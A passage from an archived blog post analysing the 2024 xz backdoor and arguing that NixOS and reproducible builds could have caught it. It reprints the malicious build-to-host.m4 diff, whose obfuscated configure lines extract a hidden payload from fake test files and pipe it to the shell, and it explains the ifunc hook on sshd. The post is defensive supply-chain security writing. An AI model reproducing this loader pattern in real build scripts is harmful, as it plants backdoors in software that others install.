<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://luj.fr/blog/how-nixos-could-have-detected-xz.html">Original</a>
    <h1>NixOS and reproducible builds could have detected the xz backdoor</h1>
    
    <div id="readability-page-1" class="page"><div>
            
<p>In March 2024, a backdoor was discovered in <code>xz</code>, a (de)-compression software that is regularly used at the core of Linux distributions to unpack source tarballs of packaged software. The backdoor had been covertly inserted by a malicious maintainer under the pseudonym of <em>Jia Tan</em> over a period of three years. This event deeply stunned the open source community as the attack was both of <strong>massive impact</strong> (it allowed <em>remote code execution</em> on all affected machines that had <code>ssh</code> installed) and <strong>extremely difficult to detect</strong>. In fact, it was only thanks to the diligence (and maybe luck) of Andres Freund – a Postgres developer working at Microsoft – that the catastrophe was avoided: while investigating a seemingly unrelated 500ms performance regression in <code>ssh</code> that he was experiencing on several <em>Debian unstable</em> machines, he was able to trace it back to the <code>liblzma</code> library, identify the backdoor and document it.</p>
<p>While it was already established that the open source supply chain was often the target of malicious actors, what is stunning is the amount of energy invested by <em>Jia Tan</em> to gain the trust of the maintainer of the <code>xz</code> project, acquire push access to the repository and then among other perfectly legitimate contributions insert – piece by piece – the code for a very sophisticated and obfuscated backdoor. This should be a wake up call for the OSS community. We should consider the open source supply chain a high value target for powerful threat actors, and to collectively find countermeasures against such attacks.</p>
<p>In this article, I’ll discuss the inner workings of the <code>xz</code> backdoor and how I think we could have mechanically detected it thanks to build reproducibility.</p>

<p>The main intent of the backdoor is to allow for <em>remote code execution</em> on the target by hijacking the <code>ssh</code> program. To do that, it replaces the behavior of some of <code>ssh</code>’s functions (most importantly the <code>RSA_public_decrypt</code> one) in order to allow an attacker to execute arbitrary commands on a victim’s machine when some specific RSA key is used to log in. Two main pieces are combined to put together to install and activate the backdoor:</p>
<ol type="1">
<li><p><strong>A script to de-obfuscate and install a malicious object file as part of the <code>xz</code> build process.</strong>
Interestingly the backdoor was not comprehensively contained in the source code for <code>xz</code>. Instead, the malicious components were only contained in tarballs built and signed by the malicious maintainer <em>Jia Tan</em> and published alongside releases <code>5.6.0</code> and <code>5.6.1</code> of <code>xz</code>. This time the additional release tarball contained slight and disguised modifications to extract a malicious object file from the <code>.xz</code> files used as data for some test contained in the repository.</p></li>
<li><p><strong>A procedure to hook the <code>RSA_public_decrypt</code> function.</strong> The backdoor uses the <em>ifunc</em> mechanism of <code>glibc</code> to modify the address of the <code>RSA_public_function</code> when <code>ssh</code> is loaded, in case <code>ssh</code> links against <code>liblzma</code> through <code>libsystemd</code>.</p></li>
</ol>
<div role="alert">
  <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 20">
    <path d="M10 .5a9.5 9.5 0 1 0 9.5 9.5A9.51 9.51 0 0 0 10 .5ZM9.5 4a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3ZM12 15H8a1 1 0 0 1 0-2h1v-3H8a1 1 0 0 1 0-2h2a1 1 0 0 1 1 1v4h1a1 1 0 0 1 0 2Z"></path>
  </svg>
  <p><span>Info</span></p><p>
  The rest of this section goes into the details of the two steps mentionned. Reading it is not necessary to understand the rest of the article. The most important takeaway here is that the backdoor was only active when using the maintainer-provided release tarball.
  </p>
</div>


<h2 id="a-script-to-de-obfuscate-and-install-a-malicious-object-file-as-part-of-the-xz-build-process">1. A script to de-obfuscate and install a malicious object file as part of the <code>xz</code> build process</h2>
<p>As explained above, the malicious object file is stored directly in the <code>xz</code> git repository, hidden in some test files. The project being a decompression software, test cases include <code>.xz</code> files to be decompressed, making it possible to hide some machine code into fake test files;
<strong>The backdoor is not active in the code contained in the git repository, it is only included by building <code>xz</code> from the tarball released by the project</strong>, which has a few differences with the actual contents of the repository, most importantly in the <code>m4/build-to-host.m4</code> file.</p>
<pre tabindex="0"><code><span><span>diff --git a/m4/build-to-host.m4 b/m4/build-to-host.m4</span></span>
<span><span>index f928e9ab..d5ec3153 100644</span></span>
<span><span>--- a/m4/build-to-host.m4</span></span>
<span><span>+++ b/m4/build-to-host.m4</span></span>
<span><span>@@</span><span> -1,4 +1,4 </span><span>@@</span></span>
<span><span>-</span><span># build-to-host.m4 serial 3</span></span>
<span><span>+</span><span># build-to-host.m4 serial 30</span></span>
<span><span> dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.</span></span>
<span><span> dnl This file is free software; the Free Software Foundation</span></span>
<span><span> dnl gives unlimited permission to copy and/or distribute it,</span></span>
<span><span>@@</span><span> -37,6 +37,7 </span><span>@@</span><span> AC_DEFUN([gl_BUILD_TO_HOST],</span></span>
<span></span>
<span><span>   dnl Define somedir_c.</span></span>
<span><span>   gl_final_[$1]=&#34;$[$1]&#34;</span></span>
<span><span>+</span><span>  gl_[$1]_prefix=`echo $gl_am_configmake | sed &#34;s/.*\.//g&#34;`</span></span>
<span><span>   dnl Translate it from build syntax to host syntax.</span></span>
<span><span>   case &#34;$build_os&#34; in</span></span>
<span><span>     cygwin*)</span></span>
<span><span>@@</span><span> -58,14 +59,40 </span><span>@@</span><span> AC_DEFUN([gl_BUILD_TO_HOST],</span></span>
<span><span>   if test &#34;$[$1]_c_make&#34; = &#39;\&#34;&#39;&#34;${gl_final_[$1]}&#34;&#39;\&#34;&#39;; then</span></span>
<span><span>     [$1]_c_make=&#39;\&#34;$([$1])\&#34;&#39;</span></span>
<span><span>   fi</span></span>
<span><span>+</span><span>  if test &#34;x$gl_am_configmake&#34; != &#34;x&#34;; then</span></span>
<span><span>+</span><span>    gl_[$1]_config=&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#39;</span></span>
<span><span>+</span><span>  else</span></span>
<span><span>+</span><span>    gl_[$1]_config=&#39;&#39;</span></span>
<span><span>+</span><span>  fi</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_path_map], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_am_configmake], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [[$1]_c_make], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl</span></span>
<span><span>   AC_SUBST([$1_c_make])</span></span>
<span><span>+</span></span>
<span><span>+</span><span>  dnl If the host conversion code has been placed in $gl_config_gt,</span></span>
<span><span>+</span><span>  dnl instead of duplicating it all over again into config.status,</span></span>
<span><span>+</span><span>  dnl then we will have config.status run $gl_config_gt later, so it</span></span>
<span><span>+</span><span>  dnl needs to know what name is stored there:</span></span>
<span><span>+</span><span>  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt=&#34;eval \$gl_[$1]_config&#34;])</span></span>
<span><span> ])</span></span>
<span></span>
<span><span> dnl Some initializations for gl_BUILD_TO_HOST.</span></span>
<span><span> AC_DEFUN([gl_BUILD_TO_HOST_INIT],</span></span>
<span><span> [</span></span>
<span><span>+</span><span>  dnl Search for Automake-defined pkg* macros, in the order</span></span>
<span><span>+</span><span>  dnl listed in the Automake 1.10a+ documentation.</span></span>
<span><span>+</span><span>  gl_am_configmake=`grep -aErls &#34;#{4}[[:alnum:]]{5}#{4}$&#34; $srcdir/ 2&gt;/dev/null`</span></span>
<span><span>+</span><span>  if test -n &#34;$gl_am_configmake&#34;; then</span></span>
<span><span>+</span><span>    HAVE_PKG_CONFIGMAKE=1</span></span>
<span><span>+</span><span>  else</span></span>
<span><span>+</span><span>    HAVE_PKG_CONFIGMAKE=0</span></span>
<span><span>+</span><span>  fi</span></span>
<span><span>+</span></span>
<span><span>   gl_sed_double_backslashes=&#39;s/\\/\\\\/g&#39;</span></span>
<span><span>   gl_sed_escape_doublequotes=&#39;s/&#34;/\\&#34;/g&#39;</span></span>
<span><span>+</span><span>  gl_path_map=&#39;tr &#34;\t \-_&#34; &#34; \t_\-&#34;&#39;</span></span>
<span><span> changequote(,)dnl</span></span>
<span><span>   gl_sed_escape_for_make_1=&#34;s,\\([ \&#34;&amp;&#39;();&lt;&gt;\\\\\`|]\\),\\\\\\1,g&#34;</span></span>
<span><span> changequote([,])dnl</span></span>
<span></span></code></pre>

<p>While these changes may look benign to the naive eyes and well commented, they are actually hiding a chain of commands that decrypts/deobfuscates several fake <code>.xz</code> test files to ultimately produce two files:</p>
<ul>
<li>a shell script that is run during the build of <code>xz</code> ;</li>
<li>a malicious binary object file.</li>
</ul>
<p>There is an <a href="https://research.swtch.com/xz-script">excellent analysis from Russ Cox</a> that explains in detail how these two malicious resources are produced during the build process, and I advise any interested reader to find all relevant details there.</p>
<p>The shell script run during the build has two main purposes:</p>
<ol type="1">
<li>Verifying that the conditions to execute the backdoor are met on the builder (the backdoor targets specific Linux distributions, needs specific features of the <code>glibc</code> activated, needs <code>ssh</code> installed, etc) ;</li>
<li>Modifying the (legitimate) <code>liblzma_la-crc64_fast.o</code> to use the <code>_get_cpuid</code> symbol defined in the backdoor object file.</li>
</ol>
<h2 id="a-procedure-to-hook-the-rsa_public_decrypt-function">2. A procedure to hook the <code>RSA_public_decrypt</code> function</h2>
<p>So how does a backdoor in the <code>xz</code> executable have any effect on <code>ssh</code>?
To understand that, we have to take a little detour in the realm of dynamic loaders and dynamically linked programs. Whenever a program depends on a library, there are two ways that library can be linked into the final executable:</p>
<ul>
<li>statically, in that case the library is embedded into the final executable, hence increasing its size ;</li>
<li>dynamically, in which case it is the role of the dynamic loader (<code>ld-linux.so</code> in Linux) to find that shared library when the program starts and load it in memory.</li>
</ul>
<p>When a program is compiled using dynamic linking, the addresses of the symbols belonging to dynamically linked libraries cannot be provided at compilation time: their position in memory is not know ahead of time! Instead, a reference to the <em>Global Offset Table</em> (or <em>GOT</em>) is inserted. When the program is started, the actual addresses are filled in the GOT by the dynamic linker.</p>
<p>The <code>xz</code> backdoor uses a functionality of the <code>glibc</code> called <em>ifunc</em> to force execution of code during dynamic loading time: <em>ifunc</em> is designed to allow selection between several implementations of the same function at dynamic loading time.</p>
<pre tabindex="0"><code><span><span>#include</span><span> &lt;stdio.h&gt;</span></span>
<span></span>
<span><span>// Declaration of ifunc resolver function</span></span>
<span><span>int</span><span> (</span><span>*</span><span>resolve_add</span><span>(</span><span>void</span><span>))(</span><span>int</span><span>,</span><span> int</span><span>);</span></span>
<span></span>
<span><span>// First version of the add function</span></span>
<span><span>int</span><span> add_v1</span><span>(</span><span>int</span><span> a</span><span>,</span><span> int</span><span> b</span><span>)</span><span> {</span></span>
<span><span>    printf</span><span>(</span><span>&#34;Using add_v1</span><span>\n</span><span>&#34;</span><span>);</span></span>
<span><span>    return</span><span> a </span><span>+</span><span> b</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Second version of the add function</span></span>
<span><span>int</span><span> add_v2</span><span>(</span><span>int</span><span> a</span><span>,</span><span> int</span><span> b</span><span>)</span><span> {</span></span>
<span><span>    printf</span><span>(</span><span>&#34;Using add_v2</span><span>\n</span><span>&#34;</span><span>);</span></span>
<span><span>    return</span><span> a </span><span>+</span><span> b</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Resolver function that chooses the correct version of the function</span></span>
<span><span>int</span><span> (</span><span>*</span><span>resolve_add</span><span>(</span><span>void</span><span>))(</span><span>int</span><span>,</span><span> int</span><span>)</span><span> {</span></span>
<span><span>    // You can implement any runtime check here.</span></span>
<span><span>    // In that case we check if the system is 64bit</span></span>
<span><span>    if</span><span> (</span><span>sizeof</span><span>(</span><span>void</span><span>*</span><span>)</span><span> ==</span><span> 8</span><span>)</span><span> {</span></span>
<span><span>        return</span><span> add_v2</span><span>;</span></span>
<span><span>    }</span><span> else</span><span> {</span></span>
<span><span>        return</span><span> add_v1</span><span>;</span></span>
<span><span>    }</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Define the ifunc attribute for the add function</span></span>
<span><span>int</span><span> add</span><span>(</span><span>int</span><span> a</span><span>,</span><span> int</span><span> b</span><span>)</span><span> __attribute__</span><span>((</span><span>ifunc</span><span>(</span><span>&#34;resolve_add&#34;</span><span>)));</span></span>
<span></span>
<span><span>int</span><span> main</span><span>()</span><span> {</span></span>
<span><span>    int</span><span> result </span><span>=</span><span> add</span><span>(</span><span>10</span><span>,</span><span> 20</span><span>);</span></span>
<span><span>    printf</span><span>(</span><span>&#34;Result: %d</span><span>\n</span><span>&#34;</span><span>,</span><span> result</span><span>);</span></span>
<span><span>    return</span><span> 0</span><span>;</span></span>
<span><span>}</span></span>
<span></span></code></pre>

<p>In the above example, the <em>ifunc</em> attribute surrounding the <code>add</code> function indicates that the version that will be executed will be determined at dynamic loading time by running the <code>resolve_add</code> function. In that case, the <code>resolve_add</code> function returns <code>add_v1</code> or <code>add_v2</code> depending if the running system is a 64 bit system or not – and as such is completely harmless – but this technique is used by the <code>xz</code> backdoor to run some malicious code at dynamic loading time.</p>
<p><em>But dynamic loading of which program?</em> Well, of <code>ssh</code>! In some Linux distributions (Debian and Fedora for example), <code>ssh</code> is patched to support <code>systemd</code> notifications and for this purpose, links with <code>libsystemd</code>, that in turn links with <code>liblzma</code>. In those distribution <code>sshd</code> hence has a transitive dependency on <code>liblzma</code>.</p>
<figure id="fig:SED-HR4049">
<img src="https://luj.fr/assets/links.png"/>
<figcaption>Dependency chain between <code>sshd</code> and <code>liblzma</code></figcaption>
</figure>
<p>This is how the backdoor works: whenever <code>sshd</code> is executed, the dynamic loader loads <code>libsystemd</code> and then <code>liblzma</code>. With the backdoor installed, and leveraging the <em>ifunc</em> functionality as explained above, the backdoor is able to run arbitrary code when <code>liblzma</code> is being loaded. Indeed, as you remember from the previous section, the backdoor script modifies one of the legitimate <code>xz</code> object files: it actually modifies the resolver of one of the functions that uses <em>ifunc</em> to call its own malicious <code>_get_cpuid</code> symbol. When called, this function meddles with the GOT (that is not yet read-only at this time of execution) to modify the address of the <code>RSA_public_decrypt</code> function, replacing it by a malicious one! That’s it, at this point <code>sshd</code> uses the malicious <code>RSA_public_decrypt</code> function that gives RCE privileges to the attacker.</p>
<p>Once again, there exist more precise reports on exactly how the hooking happens that a curious reader might read, like <a href="https://securelist.com/xz-backdoor-story-part-1/112354/">this one</a> for example. There is also <a href="https://arxiv.org/pdf/2404.08987">a research article</a> summarizing the attack vector and possible mitigations that I recommend reading.</p>

<p>What should our takeaways be from this near-miss and what should we do to minimize the risks of such an attack happening again in the future? Obviously, there is a lot to be said about the social issues at play here<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> and how we can build better resilience in the OSS ecosystem against malicious entities taking over really fundamental OSS projects, but in this piece I’ll only address the technical aspects of the question.</p>
<p>People are often convinced that OSS is more trustworthy than closed-source software because the code can be audited by practitioners and security professionals in order to detect vulnerabilities or backdoors. In this instance, this procedure has been made difficult by the fact that part of the code activating the backdoor was not included in the sources available within the git repository but was instead present in the maintainer-provided tarball. While this was used to hide the backdoor out of sight of most investigating eyes, this is also an opportunity for us to improve our software supply chain security processes.</p>
<h2 id="building-software-from-trusted-sources">Building software from trusted sources</h2>
<p>One immediate observation that we can make in reaction to this supply chain incident is that it was only effective because a lot of distributions were using the maintainer provided tarball to build <code>xz</code> instead of the raw source code supplied by the git forge (in this case, GitHub). This reliance on release tarballs has plenty of historical and practical reasons:</p>
<ul>
<li>the tarball workflow predates the existence of <code>git</code> and was used in the earliest Linux distributions;</li>
<li>tarballs are self-contained archives that encapsulate the exact state of the source code intended for release while git repositories can be altered, creating the need for a snapshot of the code;</li>
<li>tarballs can contain intermediary artifacts (for example manpages) used to lighten the build process, or configure scripts to target specific hardware, etc;</li>
<li>tarballs allow the source code to be compressed which is useful for space efficiency.</li>
</ul>
<p>This being said, these reasons do not weigh enough in my opinion to justify the security risks they create. In all places where it is technically feasible, we should build software from sources authenticated by the most trustworthy party. For example, if a project is developed on GitHub, an archive is automatically generated by GitHub for each release. The risk of a compromise of that release archive is far lower than the risk of a malicious maintainer distributing unfaithful tarballs, as it would require compromising the GitHub infrastructure (and at this point the problem is much more serious). This reasoning can be extended in all cases where the development is happening on a platform operated by a trusted third party like Codeberg/SourceHut/Gitlab, etc.</p>
<h3 id="when-the-situation-allows-it">When the situation allows it…</h3>
<p><strong>NixOS</strong> is a distribution built on the functional package management model, that is to say every package is encoded as an expression written in Nix, a functional programming language. A Nix expression for a software project is usually a function mapping all the project dependencies to a “build recipe” that can be later executed to build the package. I am a NixOS developer and I was surprised when the backdoor was revealed to see that the malicious version of <code>xz</code> had ended up being distributed to our users<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a>. While there is no policy about this, there is a culture among NixOS maintainers of using the source archive automatically generated by GitHub (that are simply snapshots of the source code) when available through the <code>fetchFromGitHub</code> function. In the simplified example of the <code>xz</code> package below, you can see that the sources for the package are actually extracted from the manually uploaded <em>malicious</em> maintainer provided tarball through another source fetcher: <code>fetchurl</code>.</p>
<pre tabindex="0"><code><span><span>{</span><span> lib</span><span>,</span><span> stdenv</span><span>,</span><span> fetchurl</span></span>
<span><span>,</span><span> enableStatic</span><span> ?</span><span> stdenv</span><span>.</span><span>hostPlatform</span><span>.</span><span>isStatic</span></span>
<span><span>}:</span></span>
<span></span>
<span><span>stdenv</span><span>.</span><span>mkDerivation </span><span>rec</span><span> {</span></span>
<span><span>  pname</span><span> =</span><span> &#34;xz&#34;</span><span>;</span></span>
<span><span>  version</span><span> =</span><span> &#34;5.6.0&#34;</span><span>;</span></span>
<span></span>
<span><span>  src</span><span> =</span><span> fetchurl </span><span>{</span></span>
<span><span>    url</span><span> =</span><span> &#34;https://github.com/tukaani-project/xz/releases/download/v</span><span>${</span><span>version</span><span>}</span><span>/xz-</span><span>${</span><span>version</span><span>}</span><span>.tar.xz&#34;</span><span>;</span></span>
<span><span>    hash</span><span> =</span><span> &#34;sha256-AWGCxwu1x8nrNGUDDjp/a6ol4XsOjAr+kncuYCGEPOI=&#34;</span><span>;</span></span>
<span><span>  };</span></span>
<span><span>...</span></span>
<span><span>}</span></span>
<span></span></code></pre>

<p>To understand why, we must first talk about the bootstrap of <code>nixpkgs</code>. The concept of a bootstrap is the idea that one could rebuild all of the packages in <code>nixpkgs</code> from a small set of seed binaries. This is an important security property because it means that there are no other external tools that one must trust in order to trust the toolchain that is used to build the software distribution. What we call the “bootstrap” in the context of a software distribution like <code>nixpkgs</code>, is all the steps needed to build the basic compilation environment to be used by other packages, called <code>stdenv</code> in nixpkgs. Building <code>stdenv</code> is not an easy task; how does one build <code>gcc</code> when one doesn’t even have a C compiler? The answer is that you start from a very small binary that does nothing fancy but is enough to build <code>hex</code>, a minimalist assembler, which in turn can build a more complex assembler, and this until we are able to build more complex software and finally a modern C compiler. The bootstraping story of Nix/Guix is an incredibly interesting topic, that I will not cover extensively here, but I strongly advise reading blog posts from the Guix community, that are on the bleeding edge (they have <a href="https://guix.gnu.org/en/blog/2023/the-full-source-bootstrap-building-from-source-all-the-way-down/">introduced a 357-byte bootstrap</a> that is being adapted for nixpkgs).</p>
<p>What does all that has to do with <code>xz</code> though? Well, <code>xz</code> is included in the nixpkgs bootstrap!</p>
<pre tabindex="0"><code><span><span>$</span><span> nix-build -A stdenv</span></span>
<span><span>/nix/store/91d27rjqlhkzx7mhzxrir1jcr40nyc7p-stdenv-linux</span></span>
<span><span>$</span><span> nix-store --query --graph result</span></span>
<span></span></code></pre>

<p><img src="https://luj.fr/assets/runtime.png"/></p>
<p>We can see now that <code>stdenv</code> depends at runtime on <code>xz</code>, so it is indeed built during the bootstrap stage. To understand a bit more why this is the case, I’ll also generate a graph of the software in <code>stdenv</code> that depends on <code>xz</code> at buildtime.</p>
<pre tabindex="0"><code><span><span>$</span><span> nix-store --query --graph </span><span>$(</span><span>nix-eval</span><span> --raw</span><span> -f</span><span> default</span><span> stdenv.drvPath</span><span>)</span></span>
<span></span></code></pre>

<p><img src="https://luj.fr/assets/buildtime.png"/></p>
<p>We can see that several packages depend on <code>xz</code>. Let’s take <code>coreutils</code> for example and try to understand why it depends on <code>xz</code> by reading its derivation file, which is the intermediary representation of the build process obtained by evaluating the Nix expression for <code>coreutils</code>:</p>
<pre tabindex="0"><code><span><span>{</span></span>
<span><span>  &#34;</span><span>/nix/store/57hlz5fnvfgljivf7p18fmcl1yp6d29z-coreutils-9.5.drv</span><span>&#34;</span><span>:</span><span> {</span></span>
<span><span>    &#34;</span><span>args</span><span>&#34;</span><span>:</span><span> [</span></span>
<span><span>      &#34;-e&#34;</span><span>,</span></span>
<span><span>      &#34;/nix/store/v6x3cs394jgqfbi0a42pam708flxaphh-default-builder.sh&#34;</span></span>
<span><span>    ],</span></span>
<span><span>    &#34;</span><span>builder</span><span>&#34;</span><span>:</span><span> &#34;/nix/store/razasrvdg7ckplfmvdxv4ia3wbayr94s-bootstrap-tools/bin/bash&#34;</span><span>,</span></span>
<span></span>
<span><span>      ...</span></span>
<span></span>
<span><span>    &#34;</span><span>inputDrvs</span><span>&#34;</span><span>:</span><span> {</span></span>
<span></span>
<span><span>      ...</span></span>
<span></span>
<span><span>      &#34;</span><span>/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv</span><span>&#34;</span><span>:</span><span> {</span></span>
<span><span>        &#34;</span><span>dynamicOutputs</span><span>&#34;</span><span>:</span><span> {},</span></span>
<span><span>        &#34;</span><span>outputs</span><span>&#34;</span><span>:</span><span> [</span></span>
<span><span>          &#34;bin&#34;</span></span>
<span><span>        ]</span></span>
<span><span>      },</span></span>
<span><span>      &#34;</span><span>/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv</span><span>&#34;</span><span>:</span><span> {</span></span>
<span><span>        &#34;</span><span>dynamicOutputs</span><span>&#34;</span><span>:</span><span> {},</span></span>
<span><span>        &#34;</span><span>outputs</span><span>&#34;</span><span>:</span><span> [</span></span>
<span><span>          &#34;out&#34;</span></span>
<span><span>        ]</span></span>
<span><span>      }</span></span>
<span><span>    },</span></span>
<span></span>
<span><span>    ...</span></span>
<span></span>
<span><span>    &#34;</span><span>system</span><span>&#34;</span><span>:</span><span> &#34;x86_64-linux&#34;</span></span>
<span><span>  }</span></span>
<span><span>}</span></span>
<span></span>
<span></span></code></pre>

<p>The <code>inputDrvs</code> field here correspond to all the other packages or expressions that the <code>coreutils</code> build process depends on. We see that in particular it depends on two components:</p>
<ul>
<li><code>/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv</code>, which is <code>xz</code> itself;</li>
<li><code>/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv</code> which is a source archive for <code>coreutils</code>! As it is a <code>.xz</code> archive, we need <code>xz</code> to unpack it and that is where the dependency comes from!</li>
</ul>
<p>The same reasoning applies to the other three direct dependencies that we could see in the graph earlier.</p>
<p><code>xz</code> being built as part of the bootstrap means it doesn’t have access to all the facilities normal packages in nixpkgs can rely on. In particular it can only access packages that are built <em>before</em> in bootstrap. For example, to build <code>xz</code> from sources, we need <code>autoconf</code> to generate the configure script. But <code>autoconf</code> has a dependency on <code>xz</code>! Using the maintainer tarball allows us to break this dependency cycle.</p>
<pre tabindex="0"><code><span><span>$</span><span> nix why-depends --derivation nixpkgs#autoconf nixpkgs#xz</span></span>
<span><span>/nix/store/2rajzdx3wkivlc38fyhj0avyp10k2vjj-autoconf-2.72.drv</span></span>
<span><span>└───/nix/store/jnnb5ihdh6r3idmqrj2ha95ir42icafq-stdenv-linux.drv</span></span>
<span><span>    └───/nix/store/sqwqnilfwkw6p2f5gaj6n1xlsy054fnw-xz-5.6.4.drv</span></span>
<span></span></code></pre>

<p>In conclusion, at the point in the <code>nixpkgs</code> graph where the <code>xz</code> package is built, the GitHub source archive cannot be used and we have to rely on the maintainer provided tarball, and hence, trust it. That does not mean that further verification cannot be implemented in <code>nixpkgs</code>, though…</p>
<h2 id="building-trust-into-untrusted-release-tarballs">Building trust into untrusted release tarballs</h2>
<p>To recap, the main reason that made NixOS vulnerable to the <code>xz</code> attack is that it is built as part of the bootstrap phase, at a point where we rely on maintainer-provided tarballs instead of the ones generated by GitHub. This incident shows that we should have specific protections in place, to ensure software built as part of our bootstrap is trustworthy.</p>
<h3 id="by-comparing-sources">1. By comparing sources</h3>
<p>One idea that comes to mind is that it should be easy, as a distribution, to verify that the sources tarballs we are using are indeed identical to the GitHub ones. There was even <a href="https://github.com/NixOS/nixpkgs/pull/300542">a pull request opened to introduce such a protection scheme</a>. While this seem like a natural idea, it doesn’t really work in practice: it’s not that rare that the maintainer provided tarball differs from the sources, and it’s often nothing to worry about.</p>
<blockquote data-embed-url="https://mastodon.social/@bagder/112181123475212554/embed"> <a href="https://mastodon.social/@bagder/112181123475212554" target="_blank"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 79 75"><path d="M74.7135 16.6043C73.6199 8.54587 66.5351 2.19527 58.1366 0.964691C56.7196 0.756754 51.351 0 38.9148 0H38.822C26.3824 0 23.7135 0.756754 22.2966 0.964691C14.1319 2.16118 6.67571 7.86752 4.86669 16.0214C3.99657 20.0369 3.90371 24.4888 4.06535 28.5726C4.29578 34.4289 4.34049 40.275 4.877 46.1075C5.24791 49.9817 5.89495 53.8251 6.81328 57.6088C8.53288 64.5968 15.4938 70.4122 22.3138 72.7848C29.6155 75.259 37.468 75.6697 44.9919 73.971C45.8196 73.7801 46.6381 73.5586 47.4475 73.3063C49.2737 72.7302 51.4164 72.086 52.9915 70.9542C53.0131 70.9384 53.0308 70.9178 53.0433 70.8942C53.0558 70.8706 53.0628 70.8445 53.0637 70.8179V65.1661C53.0634 65.1412 53.0574 65.1167 53.0462 65.0944C53.035 65.0721 53.0189 65.0525 52.9992 65.0371C52.9794 65.0218 52.9564 65.011 52.9318 65.0056C52.9073 65.0002 52.8819 65.0003 52.8574 65.0059C48.0369 66.1472 43.0971 66.7193 38.141 66.7103C29.6118 66.7103 27.3178 62.6981 26.6609 61.0278C26.1329 59.5842 25.7976 58.0784 25.6636 56.5486C25.6622 56.5229 25.667 56.4973 25.6775 56.4738C25.688 56.4502 25.7039 56.4295 25.724 56.4132C25.7441 56.397 25.7678 56.3856 25.7931 56.3801C25.8185 56.3746 25.8448 56.3751 25.8699 56.3816C30.6101 57.5151 35.4693 58.0873 40.3455 58.086C41.5183 58.086 42.6876 58.086 43.8604 58.0553C48.7647 57.919 53.9339 57.6701 58.7591 56.7361C58.8794 56.7123 58.9998 56.6918 59.103 56.6611C66.7139 55.2124 73.9569 50.665 74.6929 39.1501C74.7204 38.6967 74.7892 34.4016 74.7892 33.9312C74.7926 32.3325 75.3085 22.5901 74.7135 16.6043ZM62.9996 45.3371H54.9966V25.9069C54.9966 21.8163 53.277 19.7302 49.7793 19.7302C45.9343 19.7302 44.0083 22.1981 44.0083 27.0727V37.7082H36.0534V27.0727C36.0534 22.1981 34.124 19.7302 30.279 19.7302C26.8019 19.7302 25.0651 21.8163 25.0617 25.9069V45.3371H17.0656V25.3172C17.0656 21.2266 18.1191 17.9769 20.2262 15.568C22.3998 13.1648 25.2509 11.9308 28.7898 11.9308C32.8859 11.9308 35.9812 13.492 38.0447 16.6111L40.036 19.9245L42.0308 16.6111C44.0943 13.492 47.1896 11.9308 51.2788 11.9308C54.8143 11.9308 57.6654 13.1648 59.8459 15.568C61.9529 17.9746 63.0065 21.2243 63.0065 25.3172L62.9996 45.3371Z" fill="currentColor"></path></svg> <p>Post by @bagder@mastodon.social</p> <p>View on Mastodon</p> </a> </blockquote> 

<p>As Daniel Stenberg (the maintainer of <code>curl</code>) explains, the release tarball being different than the source is a <em>feature</em>: it allows the maintainer to include intermediary artifacts like manpages or configure scripts for example (this is especially useful for distributions that want to get rid of the dependency on <code>autoconf</code> to build the program). Of course when we care about software supply chain security, this flexibility that project maintainers have in the way they provide the release assets is actually a liability because it forces us to trust them to do it honestly.</p>
<h3 id="leveraging-bitwise-reproducibility">2. Leveraging bitwise reproducibility</h3>
<p><strong>Reproducible builds</strong> is a property of a software project that is verified if building it twice in the same conditions yields the exact same (bitwise identical) artifacts. Build reproducibility is not something easy to obtain, as there are all kinds of nondeterminisms that can happen in build processes, and making as many packages as possible reproducible is the purpose of the <a href="https://reproducible-builds.org/">reproducible-builds</a> group. It is also a property recognized as instrumental to increase the trust in the distribution of binary artifacts (see <a href="https://arxiv.org/abs/2104.06020">Reproducible Builds: Increasing the Integrity of Software Supply Chains</a> for a detailed report).</p>
<p>There are several ways bitwise reproducibility could be used to build up trust in untrusted maintainer provided tarballs:</p>
<ol>
<li><p>Reproducibly building the tarball</p>
<p>A first approach that has been <a href="https://peter.eisentraut.org/blog/2024/08/13/the-new-postgresql-17-make-dist">adopted by the postgresql project</a> is to make the tarball generation process reproducible. This allows any user (or a linux distribution) to independently verify that the maintainer provided tarball was honestly generated from the original source code.</p>
<p><img src="https://luj.fr/assets/reproducible-tarball.png"/></p>
<p>With this method, you can keep some advantages of building from tarballs (including the tarball containing some intermediary build artifacts like manpages or configure scripts). However, the drawback of this approach for software supply chain security is that it has to be implemented by upstream project maintainers. This means that adoption of this kind of security feature will probably be slow in the FOSS community, and while it is a good practice to make <em>everything</em> reproducible, including the tarball generation process, this is not the most effective way to increase software supply chain security <em>today</em>.</p></li>
<li><p>Checking for build convergence between various starting assets</p>
